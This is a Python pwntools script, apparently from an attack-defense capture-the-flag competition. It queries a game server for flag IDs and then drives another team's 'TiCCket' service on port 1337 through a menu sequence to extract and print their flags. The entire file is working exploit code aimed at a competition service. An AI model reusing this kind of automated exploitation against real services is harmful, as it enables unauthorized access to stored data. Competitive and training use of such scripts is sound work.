#!/usr/bin/env python3
import random
import string

from pwn import remote
import sys
import json
import requests


def generate_random_string():
    letters = string.ascii_letters
    random_string = ''.join(random.choice(letters) for _ in range(21))
    return random_string.encode('utf-8')


#ip = "10.60.0.1"
ip = sys.argv[1]
response = requests.get(f"http://10.10.0.1:8081/flagIds?service=TiCCket&team={ip}")
for idPair in (response.json()['TiCCket'][ip]):
    idPairs = json.loads(idPair)
    r = remote(ip, 1337)
    r.recvuntil(b">")
    r.sendline(b"1")
    r.recvuntil(b"ID:")
    r.sendline(idPairs['ctf_id'].encode())
    r.recvuntil(b":")
    r.sendline(generate_random_string())
    r.recvuntil(b">")
    r.sendline(b"3")
    r.recvuntil(b":")
    r.sendline(b"0")
    r.recvuntil(b">")
    r.sendline(b"2")
    result = r.recvuntil(b"=")
    flag = result.decode().strip().split(" ")[4]
    print(str(flag), flush=True)
